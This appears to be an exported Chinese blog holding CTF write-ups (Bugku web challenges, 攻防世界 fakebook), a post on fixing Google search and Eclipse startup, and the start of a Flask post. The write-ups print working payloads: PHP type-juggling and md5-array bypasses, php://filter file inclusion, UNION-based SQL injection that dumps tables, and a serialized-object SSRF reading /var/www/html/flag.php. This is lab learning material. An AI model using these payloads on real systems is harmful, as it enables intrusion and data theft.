<div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>观察上述代码，<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是<span class="hljs-number">0</span>自然和<span class="hljs-number">0</span>相等
<span class="hljs-symbol">2 </span><span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span> 比较的时候会将<span class="hljs-number">1</span>admin转化成数值,结果为<span class="hljs-number">1</span>，而“admin1“==<span class="hljs-number">1</span> 却等于错误，也就是<span class="hljs-string">"admin1"</span>被转化成了<span class="hljs-number">0</span>,为什么呢？？
<span class="hljs-symbol">3 </span><span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e456789"</span>相互比较的时候，会将<span class="hljs-number">0e</span>这类字符串识别为科学技术法的数字，<span class="hljs-number">0</span>的无论多少次方都是零，所以相等</code></pre></div>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>查看源码后，在最下面看到一串编码，为unicode编码</p>
<div class="hljs"><pre><code class="hljs c">&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">69</span>;&amp;#<span class="hljs-number">89</span>;&amp;#<span class="hljs-number">123</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">104</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">45</span>;&amp;#<span class="hljs-number">72</span>;&amp;#<span class="hljs-number">83</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">125</span>;</code></pre></div>

<p>使用工具转换为字符串</p>
<p><img src="https://i.loli.net/2020/11/30/LuvcilB4qgZGb9z.png" srcset="/img/loading.gif" alt></p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><strong>dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名</strong></p>
<p><strong>hosts就是本地用来解析域名为IP</strong>  </p>
<p>因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问</p>
<p>（hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts）</p>
<p>路径为：</p>
<div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc</code></pre></div>



<p><img src="https://i.loli.net/2020/11/30/9txPKZrvbMmBVSA.png" srcset="/img/loading.gif" alt></p>
<p>文件保存后在浏览器中访问该域名 获得flag</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>打开页面什么也没有，源码也没有什么发现，抓包试试</p>
<p>go完也没什么反应，有点迷惑</p>
<p>但是多go几次后，发现有张图片在变</p>
<p><img src="https://i.loli.net/2020/11/30/rm9ibzCH58Snupt.png" srcset="/img/loading.gif" alt></p>
<p>多go几次就出来了flag,原理还未知</p>
<p><img src="https://i.loli.net/2020/11/30/xO1JwbyasHEdm2k.png" srcset="/img/loading.gif" alt></p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag1.php"</span>;
highlight_file(<span class="hljs-keyword">__file__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'args'</span>]))&#123;
  $args = $_GET[<span class="hljs-string">'args'</span>];
  <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/^\w+$/"</span>,$args))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"args error!"</span>);
  &#125;
  <span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump($$args);"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p> 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 </p>
<p> <strong>Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。</strong> </p>
<p> <strong>GLOBALS:一个包含了全部变量的全局组合数组</strong> </p>
<p>即将include”flag.php”作为全局变量在本页面输出</p>
<p>?args=GLOBALS</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>源码中一串特别的代码jsfuck,</p>
<p>直接放在浏览器的控制台中运行</p>
<p><img src="https://i.loli.net/2020/11/30/WwkYd4az3l8UA1N.png" srcset="/img/loading.gif" alt></p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开页面什么也没有</p>
<p>扫描目录，扫出来一大堆没用的，直接抓包</p>
<p>。。。。就出来了</p>
<p><img src="https://i.loli.net/2020/11/30/LRTIs3Yt8jEmlip.png" srcset="/img/loading.gif" alt></p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>名字提示了，网站被黑。</p>
<p>打开题目，发现鼠标动不了，可能是被黑后的后遗症</p>
<p>先扫描目录发现了<code>shell.php</code>,这可能是上次黑客留下的小马文件</p>
<p><img src="https://i.loli.net/2020/11/30/rJi2yPYftQqNCgV.png" srcset="/img/loading.gif" alt></p>
<p>打开页面，需要密码，这就需要爆破了(密码为hack)</p>
<p>确定要爆破的变量</p>
<p><img src="https://i.loli.net/2020/11/30/1bgKrVolsLa4XEh.png" srcset="/img/loading.gif" alt></p>
<p>加载密码字典</p>
<p><img src="https://i.loli.net/2020/11/30/LcOoCkEFrnDVsvx.png" srcset="/img/loading.gif" alt></p>
<p>出现结果（根据length确定密码）</p>
<p><img src="https://i.loli.net/2020/11/30/YX6nAbTF75tfOI4.png" srcset="/img/loading.gif" alt></p>
<p>密码为<code>hack</code></p>
<p>登录即可</p>
<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>随便输入一个账号发现提示IP</p>
<p>想到了<code>X-FORWORADED-FOR:127.0.0.1</code></p>
<p>抓包试试</p>
<p>在响应包中发现一段base64编码<code>dGVzdDEyMw==</code> 解密后为test123，猜测为登录密码</p>
<p>结果真对了</p>
<p><img src="https://i.loli.net/2020/11/30/EuicNWmtOxRD25J.png" srcset="/img/loading.gif" alt></p>
<p>当然这题也可以使用爆破的方法做，但是密码字典需要包含test123</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码发现一段js代码</p>
<p>将最后的eval改成alert(),直接在浏览器中运行弹出结果</p>
<div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSubmit</span>(<span class="hljs-params"></span>)</span>&#123;
<span class="hljs-keyword">var</span> a=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"password"</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-string">"undefined"</span>!=<span class="hljs-keyword">typeof</span> a)&#123;
<span class="hljs-keyword">if</span>(<span class="hljs-string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)
<span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;
alert(<span class="hljs-string">"Error"</span>);
a.focus();
<span class="hljs-keyword">return</span>!<span class="hljs-number">1</span>&#125;
&#125;
<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"levelQuest"</span>).onsubmit=checkSubmit;</code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/SbN4rkwL2MHlOiQ.png" srcset="/img/loading.gif" alt></p>
<p><code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code></p>
<p>直接输入67d709b2b54aa2aa648cf6e87a7114f1</p>
<p><img src="/2020/09/06/bugku1-10/web41.png" srcset="/img/loading.gif" alt></p>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有</p>
<p>注意到了url:<a href="http://123.206.87.240:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=show.php</a></p>
<p>出现file这个参数，想到了文件包含的漏洞</p>
<p>用下面的payload,获取index.php，源码的base64值</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<div class="hljs"><pre><code class="hljs llvm">PGh<span class="hljs-number">0</span>bWw+DQogICAgPHRpdGxlPkJ<span class="hljs-number">1</span>Z<span class="hljs-number">2</span>t<span class="hljs-number">1</span>LWN<span class="hljs-number">0</span>ZjwvdGl<span class="hljs-number">0</span>bGU+DQogICAgDQo<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocA<span class="hljs-number">0</span>KCWVycm<span class="hljs-number">9</span>yX<span class="hljs-number">3</span>JlcG<span class="hljs-number">9</span>ydGluZygwKTsNCglpZighJF<span class="hljs-number">9</span>HRVRbZmlsZV<span class="hljs-number">0</span>pe<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>gJzxhIGhyZWY<span class="hljs-number">9</span>I<span class="hljs-keyword">i4</span>vaW<span class="hljs-number">5</span>kZXgucGhwP<span class="hljs-number">2</span>ZpbGU<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>hvdy<span class="hljs-number">5</span>waHAiPmNsaWNrIG<span class="hljs-number">1</span>lPyBubzwvYT<span class="hljs-number">4</span>nO<span class="hljs-number">30</span>NCgkkZmlsZT<span class="hljs-number">0</span>kX<span class="hljs-number">0</span>dFVFsnZmlsZSddOw<span class="hljs-number">0</span>KCWlmKHN<span class="hljs-number">0</span>cnN<span class="hljs-number">0</span>cigkZmlsZSwiL<span class="hljs-keyword">i4</span>vIil<span class="hljs-number">8</span>fHN<span class="hljs-number">0</span>cmlzdHIoJGZpbGUsICJ<span class="hljs-number">0</span>cCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJpbnB<span class="hljs-number">1</span>dCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJkYXRhIikpew<span class="hljs-number">0</span>KCQllY<span class="hljs-number">2</span>hvICJPaCBubyEiOw<span class="hljs-number">0</span>KCQlleGl<span class="hljs-number">0</span>KCk<span class="hljs-number">7</span>DQoJfQ<span class="hljs-number">0</span>KCWluY<span class="hljs-number">2</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>ZGUoJGZpbGUpOyANC<span class="hljs-keyword">i8</span>vZmxhZzpmbGFne<span class="hljs-number">2</span>VkdWxjbmlfZWxpZl<span class="hljs-number">9</span>sYWNvbF<span class="hljs-number">9</span>zaV<span class="hljs-number">9</span>zaWh<span class="hljs-number">0</span>fQ<span class="hljs-number">0</span>KPz<span class="hljs-number">4</span>NCjwvaHRtbD<span class="hljs-number">4</span>NCg==</code></pre></div>

<p>解码为</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;
  
&lt;?php
	error_reporting(0);
	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
	$file&#x3D;$_GET[&#39;file&#39;];
	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
		echo &quot;Oh no!&quot;;
		exit();
	&#125;
	include($file); 
&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;
?&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<p>获取flag{edulcni_elif_lacol_si_siht}</p>
<h2 id="请输入密码"><a href="#请输入密码" class="headerlink" title="请输入密码"></a>请输入密码</h2><p>提示了5位数的密码，直接爆破，可用burpsuit的爆破模块</p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开题目后，出现一段代码，应该是md5值，可是解码为空密码</p>
<p>扫描目录<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p>
<p><img src="https://i.loli.net/2020/11/30/QXP6HA2p4Ul5gaS.png" srcset="/img/loading.gif" alt></p>
<p>发现了<code>index.php.bak</code></p>
<blockquote>
<p>这个应该是在编辑这个文件时，自动生成的备份文件；<br>EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；<br>如果编辑后没有什么问题；<br>可以删除.BAK文件             (来自百度)</p>
</blockquote>
<p>下载.bak文件打开后，发现源码，开始审计</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"></span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">   */</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;
ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);
$str = substr($str,<span class="hljs-number">1</span>);
$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);<span class="hljs-comment">//对key进行了过滤</span>
parse_str($str);
<span class="hljs-keyword">echo</span> md5($key1);

<span class="hljs-keyword">echo</span> md5($key2);
<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;<span class="hljs-comment">//这里需要使用md()函数对数组处理时的漏洞</span>
    <span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"取得flag"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>url:<code>http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss</code></p>
<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<div class="hljs"><pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a</code></pre></div><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>打开页面像是注入的题目</p>
<p>测试一些</p>
<div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
1' and 1=2 #</code></pre></div>
<p>   第一个语句正常，第二个语句不显示内容，可以判断存在注入点</p>
<h3 id="1-判断字段数"><a href="#1-判断字段数" class="headerlink" title="1.判断字段数"></a>1.判断字段数</h3><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">#</span></code></pre></div>



<h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>-1&apos; union select 1,database(),3,4 #
database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 #

 table:fl4g,sc</code></pre></div><h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #
 skctf_flag</code></pre></div><p> 得到flag</p>
<div class="hljs"><pre><code class="hljs clojure">(<span class="hljs-name">select</span> skctf_flag from skctf_flag.fl4g)</code></pre></div>

<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
url=<span class="hljs-string">'http://120.24.86.145:8002/qiumingshan/'</span>
r=requests.session()
requestpage = r.get(url)
ans=re.findall(<span class="hljs-string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="hljs-comment">#获取表达式</span>
ans=<span class="hljs-string">""</span>.join(ans)<span class="hljs-comment">#列表转为字符串</span>
ans=ans[:<span class="hljs-number">-2</span>]<span class="hljs-comment">#去掉最后的=?</span>
post=eval(ans)<span class="hljs-comment">#计算表达式的值</span>
data=&#123;<span class="hljs-string">'value'</span>:post&#125;<span class="hljs-comment">#构造post的data部分</span>
flag=r.post(url,data=data)
print(flag.text)</code></pre></div>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>md5</tag>
        <tag>脚本</tag>
        <tag>弱类型</tag>
        <tag>域名解析</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>google搜索引擎&amp;eclipse启动问题</title>
    <url>/2020/11/02/eclipse%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>谷歌搜索引擎前两天突然无法搜索东西但是可以继续访问YouTube，就**离谱。</p>
<p>由于课程原因需要学习java，今天就下载了一个Java常用的编辑器eclipse，但是启动时给我一个弹窗，版本不一致。</p>
<a id="more"></a>

<h1 id="google浏览器"><a href="#google浏览器" class="headerlink" title="google浏览器"></a>google浏览器</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Google浏览器可以访问外网，但是无法使用搜索引擎搜东西，每次显示无法连接<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>一开始想着卸载重装，发现还是不行，后来换成了测试版本结果真能用，但是两天没到又出现那种情况，很无语</p>
<p>想着应该是google.com被屏蔽了，试着清除dns缓存</p>
<div class="hljs"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /flushdns</code></pre></div>

<p>还是不行，直接释放ip重新申请</p>
<div class="hljs"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span> /release
<span class="hljs-built_in">ipconfig</span> /renew</code></pre></div>

<p>然后就可以用了。。</p>
<p>（几个小时过去了就他妈不能用了，真尼玛离谱）</p>
<h1 id="eclipse问题"><a href="#eclipse问题" class="headerlink" title="eclipse问题"></a>eclipse问题</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>弹窗内容</p>
<p>Version 1.8.0_271 of the JVM is not suitable for this product.Version: 11or greater is required.</p>
<p>JVM的1.8.0_271版本不适合此产品。版本：11或更高版本是必需的。</p>
<p>大概意思就是当前的jvm版本与软件不相容</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="1-找到java安装的路径"><a href="#1-找到java安装的路径" class="headerlink" title="1.找到java安装的路径"></a>1.找到java安装的路径</h3><p>默认安装是下面这个路径</p>
<div class="hljs"><pre><code class="hljs fortran">C:\<span class="hljs-function"><span class="hljs-keyword">Program</span></span> Files\Java\</code></pre></div>

<p>找到</p>
<div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\J</span>ava<span class="hljs-symbol">\j</span>re1.8.0_271<span class="hljs-symbol">\b</span>in<span class="hljs-symbol">\j</span>avaw.exe</code></pre></div>



<h3 id="2-打开eclipse的安装路径，打开eclipse-ini"><a href="#2-打开eclipse的安装路径，打开eclipse-ini" class="headerlink" title="2.打开eclipse的安装路径，打开eclipse.ini"></a>2.打开eclipse的安装路径，打开eclipse.ini</h3><p>修改成下面这样</p>
<div class="hljs"><pre><code class="hljs stylus">-startup
plugins/org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.equinox</span><span class="hljs-selector-class">.launcher_1</span>.<span class="hljs-number">5.800</span><span class="hljs-selector-class">.v20200727-1323</span>.jar
--launcher.library
plugins/org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.equinox</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.win32</span><span class="hljs-selector-class">.win32</span><span class="hljs-selector-class">.x86_64_1</span>.<span class="hljs-number">1.1300</span>.v20200819-<span class="hljs-number">0940</span>
-product
org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.epp</span><span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.java</span>.product
-showsplash
org<span class="hljs-selector-class">.eclipse</span><span class="hljs-selector-class">.epp</span><span class="hljs-selector-class">.package</span>.common
--launcher.defaultAction
openFile
--launcher.defaultAction
openFile
--launcher.appendVmargs
-vm                                               <span class="hljs-comment">//这两行</span>
C:\Program Files\Java\jre1.<span class="hljs-number">8.0</span>_271\bin\javaw<span class="hljs-selector-class">.exe</span>  <span class="hljs-comment">//是添加的</span>
-vmargs
-Dosgi.requiredJavaVersion=<span class="hljs-number">1.8</span>                    <span class="hljs-comment">//这里改为jdk版本号</span>
-Dosgi<span class="hljs-selector-class">.instance</span><span class="hljs-selector-class">.area</span>.default=@user.home/eclipse-workspace
-XX:+UseG1GC
-XX:+UseStringDeduplication
--add-modules=ALL-SYSTEM
-Dosgi.requiredJavaVersion=<span class="hljs-number">1.8</span>					  <span class="hljs-comment">//这里也一样</span>
-Dosgi.dataAreaRequiresExplicitInit=true
-Xms256m
-Xmx2048m
--add-modules=ALL-SYSTEM</code></pre></div>

<p>保存后成功启动。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>fakebook</title>
    <url>/2020/09/27/fakebook/</url>
    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
<a id="more"></a>

<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
<p>接下来继续注入的常规操作。</p>
<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" srcset="/img/loading.gif" alt></p>
<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
<p><strong>爆表名</strong></p>
<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" srcset="/img/loading.gif" alt></p>
<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
<p>爆出一大堆列名。直接读取data的内容</p>
<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
<p>发现内容是注册时信息保存为序列化内容</p>
<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
<p>到这里就不知道怎么办了。。。</p>
<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" srcset="/img/loading.gif" alt></p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = $name;
    <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;
    <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span> // 处理<span class="hljs-title">url</span></span>
<span class="hljs-function"></span>&#123;
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
    &#125;
    curl_close($ch);

    <span class="hljs-keyword">return</span> $output;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);
&#125;
&#125;</code></pre></div>
<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
<div class="hljs"><pre><code class="hljs groovy">?no=-2%20union/**/select%201,2,3,'O:<span class="hljs-number">8</span>:<span class="hljs-string">"UserInfo"</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-string">i:</span><span class="hljs-number">22</span>;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-string">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">"file:///var/www/html/flag.php"</span>;&#125;<span class="hljs-string">'%20#</span></code></pre></div>

<p>查看源码，解base64。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>unserailize</tag>
      </tags>
  </entry>
  <entry>
    <title>flask</title>
    <url>/2021/02/08/flask/</url>
    <content><![CDATA[<p>flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路</p>
<a id="more"></a>

<h1 id="0x1-基础知识"><a href="#0x1-基础知识" class="headerlink" title="0x1 基础知识"></a>0x1 基础知识</h1><p>从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎</p>
<h2 id="模板的基本语法"><a href="#模板的基本语法" class="headerlink" title="模板的基本语法"></a>模板的基本语法</h2><p>官方文档对于模板的语法介绍如下</p>
